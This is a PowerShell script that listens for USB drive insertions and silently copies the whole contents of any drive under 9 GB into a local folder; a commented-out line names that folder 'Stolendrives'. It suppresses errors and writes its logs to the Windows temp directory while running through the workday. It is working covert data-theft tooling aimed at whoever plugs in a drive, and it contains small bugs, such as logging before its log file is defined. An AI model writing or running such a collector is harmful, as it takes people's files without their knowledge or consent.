#Requires -version 2.0


$serial=$null

#serial Generator
for($i=1; $i -le 10; $i++){

$safe=(26/36)*100
$randomfyer=get-random -min 0 -max 99
if($randomfyer -le $safe){
$a=Get-Random -Count 1 -InputObject (65..90) | % -begin {$aa=$null} -process {$aa += [char]$_} -end {$aa}}
else{$a=get-random -max 9 -min 0}

#write-host "$a" -nonewline
$serial="$serial$a"}

write-host "$serial"

##change directory
set-location C:\BU

#error action (change to "silentlycontinue" to ignore errors, inquire to ask before proceeding)
$ErrorActionPreference = "silentlycontinue"
Log-Write -LogPath "C:\Windows\Temp\$namelog" -LineValue "[$(get-date -f hh:mm:ss)] Error action: $erroractionpreference"

$namelog="U$serial.log"
. "C:\BU\log.ps1"
Log-Start -LogPath "C:\Windows\Temp" -logname "$namelog" -ScriptVersion "1.0" -SessionID "$serial"
Log-Write -LogPath "C:\Windows\Temp\$namelog" -LineValue "[$(get-date -f hh:mm:ss)] USB Session Initiated"

Register-WmiEvent -Class win32_VolumeChangeEvent -SourceIdentifier volumeChange
write-host (get-date -format s) " Beginning script..."
$wsh = New-Object -ComObject WScript.Shell
do{
$newEvent = Wait-Event -SourceIdentifier volumeChange
$eventType = $newEvent.SourceEventArgs.NewEvent.EventType
$eventTypeName = switch($eventType)
{
1 {"Configuration changed"}
2 {"Device arrival"}
3 {"Device removal"}
4 {"docking"}
}
write-host (get-date -format s) " Event detected = " $eventTypeName
Log-Write -LogPath "C:\Windows\Temp\$namelog" -LineValue "[$(get-date -f hh:mm:ss)]     Event detected =  $eventTypeName"
if ($eventType -eq 2)
{
$driveLetter = $newEvent.SourceEventArgs.NewEvent.DriveName
$driveLabel = ([wmi]"Win32_LogicalDisk='$driveLetter'").VolumeName
$colItems = (Get-ChildItem $driveletter -recurse -ErrorAction SilentlyContinue | Measure-Object -property length -sum)
$driveSize=($colItems.sum / 1GB)
write-host (get-date -format s) " Drive name = " $driveLetter
Log-Write -LogPath "C:\Windows\Temp\$namelog" -LineValue "[$(get-date -f hh:mm:ss)] Drive name =  $driveLetter Drive label =  $driveLabel Drive size = $driveSize"
write-host (get-date -format s) " Drive label = " $driveLabel
# Execute process if drive matches specified condition(s)

if($driveSize -lt 9 -and $drivelabel -ne "Patriot|Seagate"){


Log-Write -LogPath "C:\Windows\Temp\$namelog" -LineValue "[$(get-date -f hh:mm:ss)]     Attempting to copy $drivelabel to C:\BU\STDrives\$drivelabel$serial"

#robocopy.exe $driveletter C:\BU\Stolendrives\$drivelabel\$(get-date -f MM.dd.yyyy.HH.mm) "*.*" /e 
Copy-Item -path "$driveletter" -destination C:\BU\STDrives\$drivelabel$serial -recurse

Log-Write -LogPath "C:\Windows\Temp\$namelog" -LineValue "[$(get-date -f hh:mm:ss)]     Copy complete"
Log-Write -LogPath "C:\Windows\Temp\$namelog" -LineValue "[$(get-date -f hh:mm:ss)]     Returning to idle"

}else{

Log-Write -LogPath "C:\Windows\Temp\$namelog" -LineValue "[$(get-date -f hh:mm:ss)]     $drivelabel is $drivesize > 9GB"
Log-Write -LogPath "C:\Windows\Temp\$namelog" -LineValue "[$(get-date -f hh:mm:ss)]  !   No Copy"
write-host "not less than 9"
}




}

Remove-Event -SourceIdentifier volumeChange
} while ((get-date).hour -le 15) #Loop until next event
Unregister-Event -SourceIdentifier volumeChange

Log-Write -LogPath "C:\Windows\Temp\$namelog" -LineValue "[$(get-date -f hh:mm:ss)]  Time to go home"
Log-Finish -LogPath "C:\Windows\Temp\$namelog" -NoExit $True
exit